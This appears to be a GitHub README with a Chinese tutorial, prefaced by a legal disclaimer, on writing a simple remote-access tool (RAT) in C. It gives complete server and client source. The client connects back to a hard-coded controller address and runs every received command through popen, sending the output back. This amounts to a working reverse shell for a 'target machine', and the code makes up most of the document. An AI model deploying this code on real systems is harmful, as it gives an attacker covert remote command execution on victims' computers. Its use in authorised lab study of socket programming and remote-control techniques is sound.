# ghost
Remote control script, capable of executing any code, compiled in C language, with good portability


## 利用socket来实现简单远控

### **🔹 免责声明**

本篇文章仅用于 **技术研究、网络安全学习与合法运维管理**，旨在帮助理解 **Socket 网络编程** 及 **远程控制技术（RAT）** 的实现原理。所有示例代码和技术讲解均在本地运行。

**⚠️ 重要提示：**

- **严禁** 在未经授权的情况下，擅自使用本文涉及的技术对任何计算机、服务器或网络进行未经许可的访问、控制或破坏。
- **严禁** 将本文提供的知识用于非法目的，包括但不限于 **恶意入侵、数据窃取、黑客攻击** 等行为。
- **任何因滥用本文技术所造成的法律责任，均由使用者自行承担，我本人及本文概不负责！**

下边开始讲解如何利用socket来实现远程控制

远程控制，顾名思义就是使用本地计算机控制远程计算机，要实现两者之间的通信就是一个重要的问题，那么使用socket（又称作套接字）来实现两者之间的通信是一个不错的选择。

一、什么是socket？

socket（套接字）是网络编程中用于 两台计算机之间通信的端点。它是 TCP/IP 网络通信的基础，支持数据发送和接收，可以在本地或远程设备之间建立连接。

二、如何使用socket来实现两台计算机之间的通信？

在c语言中，socket主要用于TCP/IP或UDP，考虑通信的可靠性，可以使用socket来创建一个TCP通信的端点。

要实现远控，需要在本地计算机上运行一个服务端，并且在靶机上运行一个客户端，而socket就是两者实现通信的桥梁，下边就来介绍如何使用c语言编写服务端和客户端。

**服务端：**

1、首先需要创建一个socket；

```c
int sock_fd, client_socket_fd;
	struct sockaddr_in server_addr, client_addr;
	socklen_t addr_len = sizeof(client_addr);
	sock_fd = socket(AF_INET, SOCK_STREAM, 0);

	if (sock_fd == -1) {
	perror("❌ creat socket faild!\n");
	exit(1);
	}
```

可以看到存在一个结构体sockaddr_in，它定义在<netinet/in.h>头文件中；

```c
struct sockaddr_in {
    sa_family_t    sin_family;   // 地址族，必须是 AF_INET（IPv4）
    in_port_t      sin_port;     // 端口号（需要用 htons() 转换）
    struct in_addr sin_addr;     // IP 地址（用 inet_addr() 或 inet_pton() 赋值）
    char           sin_zero[8];  // 填充字段（一般不用）
};
```

2、绑定IP以及端口

```c
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr("192.168.239.131");
	server_addr.sin_port = htons(PORT);
	if( bind(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1){
		perror("❌ bind faild!\n");
		close(sock_fd);
		exit(1);
	}
```

可以看到这一步就定义了server_addr结构体中的sin_family、sin_addr、sin_port详细信息，因为我本地虚拟机的ip地址是192.168.239.131，因此我将server_addr.sin_addr.s_addr绑定为本地计算机ip地址；端口可以自己设置，一般使用比较大的端口，防止端口被占用。

3、开启监听

```c
	if(listen(sock_fd, 5) == -1){
		perror("❌ listen faild!\n");
		close(sock_fd);
		exit(1);
	}
```

listen函数原型：

```c
int listen(int sockfd, int backlog);
```

sockfd就是服务器socket文件描述符，也就是socket()的返回值；

backlog是最大等待连接数；

如果成功则返回0，失败则返回-1；

4、接受客户端连接

```c
	client_socket_fd = accept(sock_fd, (struct sockaddr *)&client_addr, &addr_len);
	if (client_socket_fd == -1){
		perror("❌ connection faild!\n");
		close(sock_fd);
		exit(1);
	}
```

如果成功连接则返回一个新的socket文件描述符，失败则返回-1；

5、客户端连接上之后就是命令执行

```c
	printf("✅ target is on!\n");

	execute_command(client_socket_fd);

  close(client_socket_fd);
  close(sock_fd);
```

运行完之后关闭进程；

execute_command():

```c
void execute_command(int client_socket_fd){
	char buf[1024];
	char command[1024];
	int recv_bytes;
	while (1) {
		printf("shell>>");
		fgets(command, sizeof(command), stdin);
		if(send(client_socket_fd, command, strlen(command), 0) == -1){
			perror("❌ send faild!!\n");
			break;
		}
		memset(buf, 0, sizeof(buf));
		recv_bytes = recv(client_socket_fd, buf, sizeof(buf) - 1, 0);
		
		if (recv_bytes > 0){
			buf[recv_bytes] = '\0';
			printf("the output:\n%s\n", buf);
		}else if (recv_bytes == 0){
			perror("❌ recv message faild!!\n");
			break;
		} else {
			perror("❌ recv() faild!!\n");
			break;
		}
	}
}
```

通过send()、recv()函数来实现计算机之间的数据发送与接收；

这里我对与回显为空的命令强制返回了字符串，避免服务端因为接收不到数据而卡住的情况。

完整的服务端代码：

```c
//by lee
//https://blog.csdn.net/weixin_51055545?type=blog
//gcc server.c -o server
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 1337

void banner(){
	printf("creat by Lee\n");
	printf("version 1.0\n");
}

void execute_command(int client_socket_fd){
	char buf[1024];
	char command[1024];
	int recv_bytes;
	while (1) {
		printf("shell>>");
		fgets(command, sizeof(command), stdin);
		if(send(client_socket_fd, command, strlen(command), 0) == -1){
			perror("❌ send faild!!\n");
			break;
		}
		memset(buf, 0, sizeof(buf));
		recv_bytes = recv(client_socket_fd, buf, sizeof(buf) - 1, 0);
		
		if (recv_bytes > 0){
			buf[recv_bytes] = '\0';
			printf("the output:\n%s\n", buf);
		}else if (recv_bytes == 0){
			perror("❌ recv message faild!!\n");
			break;
		} else {
			perror("❌ recv() faild!!\n");
			break;
		}
	}
}


int main(){

	banner();
	int sock_fd, client_socket_fd;
	struct sockaddr_in server_addr, client_addr;
	socklen_t addr_len = sizeof(client_addr);
	sock_fd = socket(AF_INET, SOCK_STREAM, 0);

	if (sock_fd == -1) {
	perror("❌ creat socket faild!\n");
	exit(1);
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr("192.168.239.131");
	server_addr.sin_port = htons(PORT);
	if( bind(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1){
		perror("❌ bind faild!\n");
		close(sock_fd);
		exit(1);
	}

	if(listen(sock_fd, 5) == -1){
		perror("❌ listen faild!\n");
		close(sock_fd);
		exit(1);
	}

	printf("🕤 listing...\n");
	sleep(3);
	printf("🕤 waiting for target...\n");

	client_socket_fd = accept(sock_fd, (struct sockaddr *)&client_addr, &addr_len);
	if (client_socket_fd == -1){
		perror("❌ connection faild!\n");
		close(sock_fd);
		exit(1);
	}

	printf("✅ target is on!\n");

	execute_command(client_socket_fd);

    close(client_socket_fd);
    close(sock_fd);

	return 0;
}
```

**客户端**

1、首先就是创建一个socket并且连接到远程计算机

```c
//by lee
//gcc server.c -o server
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define SERVER_IP "192.168.239.131"
#define SERVER_PORT 1337

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char command[1024];
    char result[4096] = {0};


    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("❌ can not creat socket");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    printf("🕤 wait for connection...");
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("❌ can not connect to server_ip");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("✅ connect to  %s:%d success", SERVER_IP, SERVER_PORT);

```

道理和服务端一样，不赘述；

2、之后就是利用while循环来执行服务端发送过来的命令

```c
    while (1) {
        memset(command, 0, sizeof(command));

        int recv_bytes = recv(sock, command, sizeof(command) - 1, 0);
        if (recv_bytes <= 0) {
            printf("❌ connection is break\n");
            break;
        }

        command[recv_bytes] = '\0';//确保接收到的命令完整;

        if (strncmp(command, "exit", 4) == 0) {
            printf("🔴 break connection\n");
            break;
        }


        FILE *fp = popen(command, "r"); // 执行command;
        if (fp == NULL) {
            char *error_msg = "❌ can not execute command\n";
            send(sock, error_msg, strlen(error_msg), 0);
            continue;
        }

				memset(result, 0, sizeof(result));
				fread(result, 1, sizeof(result) - 1, fp);
	
				if (strlen(result)==0){
            strcpy(result,"no output");//返回值为空，就强制返回no output;
            break;
				}

				result[strlen(result)] = '\0';
				pclose(fp);

				send(sock, result, strlen(result), 0);
    }
```

完整的客户端代码：

```c
//by lee
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define SERVER_IP "192.168.239.131"
#define SERVER_PORT 1337

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char command[1024];
    char result[4096] = {0};


    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("❌ can not creat socket");
        exit(EXIT_FAILURE);
    }


    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    printf("🕤 wait for connection...");
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("❌ can not connect to server_ip");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("✅ connect to  %s:%d success", SERVER_IP, SERVER_PORT);

    while (1) {
        memset(command, 0, sizeof(command));


        int recv_bytes = recv(sock, command, sizeof(command) - 1, 0);
        if (recv_bytes <= 0) {
            printf("❌ connection is break\n");
            break;
        }

        command[recv_bytes] = '\0';

        if (strncmp(command, "exit", 4) == 0) {
            printf("🔴 break connection\n");
            break;
        }


        FILE *fp = popen(command, "r"); // execute shell command
        if (fp == NULL) {
            char *error_msg = "❌ can not execute command\n";
            send(sock, error_msg, strlen(error_msg), 0);
            continue;
        }

				memset(result, 0, sizeof(result));
				fread(result, 1, sizeof(result) - 1, fp);
	
				if (strlen(result)==0){
            strcpy(result,"no output");
            break;
				}

				result[strlen(result)] = '\0';
				pclose(fp);

				send(sock, result, strlen(result), 0);
    }

    close(sock);
    return 0;
}
```

**使用方法及运行效果**

在本地计算机运行服务端

```shell
./server
```

![image-20250317223549217](https://c.img.dasctf.com/LightPicture/2025/04/8571bbd58dbee2d6.png)

此时等待靶机去连接；

在靶机中运行客户端

```shell
./client
```

![image-20250317223645619](https://c.img.dasctf.com/LightPicture/2025/04/05cdce35e8dadaaf.png)

此时再回到服务端计算机中，显示：

![image-20250317223717117](https://c.img.dasctf.com/LightPicture/2025/04/2f2f1a8e15ba0aec.png)

此时就可以输入命令来控制靶机了；

![image-20250317223749650](https://c.img.dasctf.com/LightPicture/2025/04/5be1ec4df4e9c78e.png)

感兴趣的师傅们还可以在上述的代码进行添加和更改来添加更多功能！
